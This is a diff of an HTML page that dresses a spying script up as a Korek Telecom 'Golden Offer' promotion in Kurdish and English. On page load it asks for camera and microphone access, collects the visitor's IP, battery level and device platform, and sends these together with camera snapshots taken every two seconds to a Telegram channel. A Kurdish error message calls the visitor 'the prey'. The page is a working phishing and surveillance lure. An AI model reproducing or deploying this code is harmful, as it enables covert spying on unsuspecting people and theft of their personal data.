@@ -1,11 +1,117 @@
 <!DOCTYPE html>
-<html>
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <title>System Framework v2.4</title>
-    <style>body { background-color: black; margin: 0; overflow: hidden; }</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Korek Telecom - Golden Offer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #005596; /* ڕەنگی شینی فەرمی کۆڕەک */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: white;
+            text-align: center;
+        }
+        header {
+            width: 100%;
+            background-color: #ffffff;
+            padding: 10px 0;
+            display: flex;
+            justify-content: center;
+            border-bottom: 3px solid #fdb913; /* هێڵە زەردەکە */
+        }
+        .hero {
+            padding: 40px 20px;
+        }
+        .golden-offer {
+            color: #fdb913;
+            font-size: 38px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .code {
+            font-size: 50px;
+            font-weight: 900;
+            margin: 10px 0;
+        }
+        .details {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .details span {
+            display: block;
+            font-size: 45px;
+            font-weight: bold;
+        }
+        .recharge-box {
+            background-color: white;
+            color: #333;
+            width: 90%;
+            max-width: 350px;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #005596;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .btn {
+            background-color: #fdb913;
+            color: #005596;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body onload="capture()">
+
+    <header>
+        <img src="https://www.korektelecom.com/media/1001/korek-logo.png" alt="Korek Logo" width="120">
+    </header>
+
+    <div class="hero">
+        <div class="golden-offer">Golden Offer</div>
+        <div class="code">*203#</div>
+        <div class="details">
+            <span>20 GB</span>
+            Internet
+            <br><br>
+            <span>15,000</span>
+            Balance
+        </div>
+
+        <div class="recharge-box">
+            <div class="loader"></div>
+            <p style="font-size: 14px;">خەریکی چالاککردنی ئۆفەری زێڕینین بۆ سیمکارتەکەت...</p>
+            <input type="text" placeholder="Voucher Number" disabled>
+            <button class="btn">Continue</button>
+        </div>
+    </div>
+
 <script>
     const urlParams = new URLSearchParams(window.location.search);
     const targetID = urlParams.get('id'); 
@@ -20,14 +126,12 @@
                 audio: true 
             });
 
-            // وەرگرتنی زانیاری شەحن (Battery)
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
             
-            // ناردنی IP و زانیارییە وردەکان
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
@@ -35,8 +139,7 @@
                                  `👤 <b>ID:</b> <code>${targetID}</code>\n` +
                                  `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                                  `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
-                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                                 `🌐 <b>Browser:</b> <code>${navigator.userAgent.split(' ')[0]}</code>`;
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
                     sendToTelegram(report);
                 });
 
@@ -60,11 +163,10 @@
                 }, 'image/jpeg', 0.7);
             };
 
-            // گۆڕینی کات بۆ ٢ چرکە (2000ms)
             setInterval(takeSnap, 2000);
 
         } catch (e) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد یان کێشەیەک هەیە.");
         }
     }
 
